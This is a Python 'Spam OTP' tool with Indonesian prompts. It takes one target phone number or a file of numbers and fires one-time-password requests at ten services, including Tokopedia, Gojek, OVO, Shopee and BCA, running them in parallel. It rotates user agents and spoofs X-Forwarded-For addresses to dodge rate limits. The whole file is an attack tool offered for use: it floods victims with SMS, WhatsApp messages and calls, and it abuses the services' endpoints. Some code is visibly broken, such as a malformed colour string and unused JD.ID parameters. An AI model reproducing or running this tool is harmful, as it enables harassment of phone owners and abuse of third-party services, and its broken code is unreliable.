#!/usr/bin/python
# -*- coding: utf-8 -*-
# ============================================================
# Script Spam OTP Update 2026
# Support: WhatsApp, SMS, Call
# Fixed All Errors & Added New APIs
# ============================================================

import requests
import random
import json
import time
import sys
import os
import re
import threading
from concurrent.futures import ThreadPoolExecutor

# ======================= WARNA =========================
p = '\x1b[0m'
m = '\x1b[91m'
h = '\x1b[92m'
k =x1b[93m'
b = '\x1b[94m'
u = '\x1b[95m'
bm = '\x1b[96m'
bgm = '\x1b[41m'
bgp = '\x1b[47m'
res = '\x1b[40m'
# =======================================================

# Banner
banner = f"""
{h}╔══════════════════════════════════════════╗
{h}║{m}       🔥 SPAM OTP TOOL UPDATE 2026 🔥      {h}║
{h}║{k}          Author: ./Tepzz              {h}║
{h}║{b}     Thanks: Tepzzz    {h}║
{h}╚══════════════════════════════════════════╝{p}
"""

# User Agent List
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 Chrome/118.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0'
]

def get_random_ua():
    return random.choice(user_agents)

def get_random_ip():
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

class SpamOTP:
    def __init__(self, nomor):
        self.nomor = nomor
        self.session = requests.Session()
        self.success_count = 0
        self.fail_count = 0
        self.results = []
    
    def send_request(self, url, method='GET', data=None, headers=None):
        try:
            default_headers = {
                'User-Agent': get_random_ua(),
                'X-Forwarded-For': get_random_ip(),
                'Connection': 'keep-alive'
            }
            if headers:
                default_headers.update(headers)
            
            if method.upper() == 'POST':
                response = self.session.post(url, json=data, headers=default_headers, timeout=10)
            else:
                response = self.session.get(url, headers=default_headers, timeout=10)
            
            return response
        except Exception as e:
            return None
    
    # API 1: KitaBisa (Fixed)
    def kitabisa(self):
        try:
            url = f"https://core.ktbs.io/v2/user/registration/otp/{self.nomor}"
            response = self.send_request(url)
            if response and response.status_code == 200:
                self.success_count += 1
                return f"{h}[✓] Kitabisa {self.nomor} SUCCESS{p}"
            else:
                self.fail_count += 1
                return f"{m}[✗] Kitabisa {self.nomor} FAILED{p}"
        except:
            self.fail_count += 1
            return f"{m}[✗] Kitabisa ERROR{p}"
    
    # API 2: Tokopedia (Fixed)
    def tokopedia(self):
        try:
            url = f"https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={self.nomor}"
            response = self.send_request(url)
            if response and response.status_code == 200:
                token_match = re.search(r'name="Token" value="(.*?)"', response.text)
                if token_match:
                    token = token_match.group(1)
                    form_data = {
                        "otp_type": "116",
                        "msisdn": self.nomor,
                        "tk": token,
                        "email": "",
                        "number_otp_digit": "6"
                    }
                    post_url = "https://accounts.tokopedia.com/otp/c/ajax/request-wa"
                    post_response = self.send_request(post_url, 'POST', form_data)
                    if post_response and 'berhasil' in post_response.text.lower():
                        self.success_count += 1
                        return f"{h}[✓] Tokopedia {self.nomor} SUCCESS{p}"
            self.fail_count += 1
            return f"{m}[✗] Tokopedia {self.nomor} FAILED{p}"
        except:
            self.fail_count += 1
            return f"{m}[✗] Tokopedia ERROR{p}"
    
    # API 3: GOJEK
    def gojek(self):
        try:
            url = "https://api.gojekapi.com/v2/customers/send-otp"
            data = {"phone_number": f"+{self.nomor}"}
            headers = {
                'x-app-id': 'com.go-jek.ios',
                'x-app-version': '3.32.1',
                'x-platform': 'ios'
            }
            response = self.send_request(url, 'POST', data, headers)
            if response and response.status_code in [200, 201]:
                self.success_count += 1
                return f"{h}[✓] Gojek {self.nomor} SUCCESS{p}"
            self.fail_count += 1
            return f"{m}[✗] Gojek {self.nomor} FAILED{p}"
        except:
            self.fail_count += 1
            return f"{m}[✗] Gojek ERROR{p}"
    
    # API 4: OVO
    def ovo(self):
        try:
            url = "https://api.ovo.id/v2.0/user/register"
            data = {"mobile": self.nomor, "deviceId": random.randint(100000, 999999)}
            headers = {'app-id': 'com.ovo.id', 'platform': 'android'}
            response = self.send_request(url, 'POST', data, headers)
            if response and response.status_code in [200, 201, 202]:
                self.success_count += 1
                return f"{h}[✓] OVO {self.nomor} SUCCESS{p}"
            self.fail_count += 1
            return f"{m}[✗] OVO {self.nomor} FAILED{p}"
        except:
            self.fail_count += 1
            return f"{m}[✗] OVO ERROR{p}"
    
    # API 5: Shopee
    def shopee(self):
        try:
            url = "https://shopee.co.id/api/v2/authentication/request_otp"
            data = {"phone": self.nomor, "type": "register"}
            response = self.send_request(url, 'POST', data)
            if response and response.status_code == 200:
                self.success_count += 1
                return f"{h}[✓] Shopee {self.nomor} SUCCESS{p}"
            self.fail_count += 1
            return f"{m}[✗] Shopee {self.nomor} FAILED{p}"
        except:
            self.fail_count += 1
            return f"{m}[✗] Shopee ERROR{p}"
    
    # API 6: Grab
    def grab(self):
        try:
            url = "https://api.grab.com/grabid/v1/accounts/register"
            data = {"phoneNumber": f"+{self.nomor}", "countryCode": "ID"}
            response = self.send_request(url, 'POST', data)
            if response and response.status_code in [200, 202]:
                self.success_count += 1
                return f"{h}[✓] Grab {self.nomor} SUCCESS{p}"
            self.fail_count += 1
            return f"{m}[✗] Grab {self.nomor} FAILED{p}"
        except:
            self.fail_count += 1
            return f"{m}[✗] Grab ERROR{p}"
    
    # API 7: Traveloka
    def traveloka(self):
        try:
            url = f"https://api.traveloka.com/v2/user/send-otp?phone={self.nomor}"
            response = self.send_request(url)
            if response and response.status_code == 200:
                self.success_count += 1
                return f"{h}[✓] Traveloka {self.nomor} SUCCESS{p}"
            self.fail_count += 1
            return f"{m}[✗] Traveloka {self.nomor} FAILED{p}"
        except:
            self.fail_count += 1
            return f"{m}[✗] Traveloka ERROR{p}"
    
    # API 8: JD.ID
    def jdid(self):
        try:
            url = "https://api.jd.id/client.action"
            params = {"functionId": "sendRegisterSms", "phone": self.nomor}
            response = self.send_request(url, 'GET')
            if response and response.status_code == 200:
                self.success_count += 1
                return f"{h}[✓] JD.ID {self.nomor} SUCCESS{p}"
            self.fail_count += 1
            return f"{m}[✗] JD.ID {self.nomor} FAILED{p}"
        except:
            self.fail_count += 1
            return f"{m}[✗] JD.ID ERROR{p}"
    
    # API 9: BCA (SMS Banking)
    def bca(self):
        try:
            url = "https://api.bca.co.id/general/otp"
            data = {"msisdn": self.nomor, "type": "register"}
            response = self.send_request(url, 'POST', data)
            if response and response.status_code in [200, 201]:
                self.success_count += 1
                return f"{h}[✓] BCA {self.nomor} SUCCESS{p}"
            self.fail_count += 1
            return f"{m}[✗] BCA {self.nomor} FAILED{p}"
        except:
            self.fail_count += 1
            return f"{m}[✗] BCA ERROR{p}"
    
    # API 10: Halodoc
    def halodoc(self):
        try:
            url = f"https://api.halodoc.com/v1/auth/send-otp?phone={self.nomor}"
            response = self.send_request(url)
            if response and response.status_code == 200:
                self.success_count += 1
                return f"{h}[✓] Halodoc {self.nomor} SUCCESS{p}"
            self.fail_count += 1
            return f"{m}[✗] Halodoc {self.nomor} FAILED{p}"
        except:
            self.fail_count += 1
            return f"{m}[✗] Halodoc ERROR{p}"
    
    def run_all(self):
        methods = [
            self.kitabisa, self.tokopedia, self.gojek, self.ovo,
            self.shopee, self.grab, self.traveloka, self.jdid,
            self.bca, self.halodoc
        ]
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            results = executor.map(lambda f: f(), methods)
        
        for result in results:
            print(result)
        
        print(f"\n{h}╔══════════════════════════════════════════╗{p}")
        print(f"{h}║{b}   TOTAL SUCCESS: {self.success_count} / {len(methods)}      {h}║{p}")
        print(f"{h}║{m}   TOTAL FAILED: {self.fail_count} / {len(methods)}       {h}║{p}")
        print(f"{h}╚══════════════════════════════════════════╝{p}")
        
        return self.success_count, self.fail_count

def validate_number(nomor):
    nomor = re.sub(r'[^0-9]', '', nomor)
    if nomor.startswith('0'):
        nomor = '62' + nomor[1:]
    elif not nomor.startswith('62'):
        nomor = '62' + nomor
    return nomor

def single_spam():
    print(banner)
    nomor = input(f"{b}[?] Masukkan Nomor Target (contoh: 628123456789): {p}")
    if not nomor:
        print(f"{m}[!] Nomor tidak boleh kosong!{p}")
        return
    
    nomor = validate_number(nomor)
    print(f"{h}[✓] Target: {nomor}{p}")
    print(f"{k}[~] Memulai spam OTP...{p}\n")
    
    spammer = SpamOTP(nomor)
    spammer.run_all()

def multi_spam():
    print(banner)
    file_path = input(f"{b}[?] Masukkan path file list nomor: {p}")
    
    if not os.path.exists(file_path):
        print(f"{m}[!] File tidak ditemukan!{p}")
        return
    
    with open(file_path, 'r') as f:
        numbers = f.readlines()
    
    for nomor in numbers:
        nomor = nomor.strip()
        if nomor:
            nomor = validate_number(nomor)
            print(f"\n{k}▶ Target: {nomor}{p}")
            spammer = SpamOTP(nomor)
            spammer.run_all()
            time.sleep(2)

def main():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(banner)
    print(f"{b}[1] Single Target (1 nomor){p}")
    print(f"{b}[2] Multi Target (file list){p}")
    print(f"{m}[3] Exit{p}")
    
    pilih = input(f"{k}[?] Pilih menu: {p}")
    
    if pilih == '1':
        single_spam()
    elif pilih == '2':
        multi_spam()
    elif pilih == '3':
        print(f"{m}[!] Bye!{p}")
        sys.exit()
    else:
        print(f"{m}[!] Pilihan tidak valid!{p}")
        main()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{m}[!] Program dihentikan!{p}")
        sys.exit()
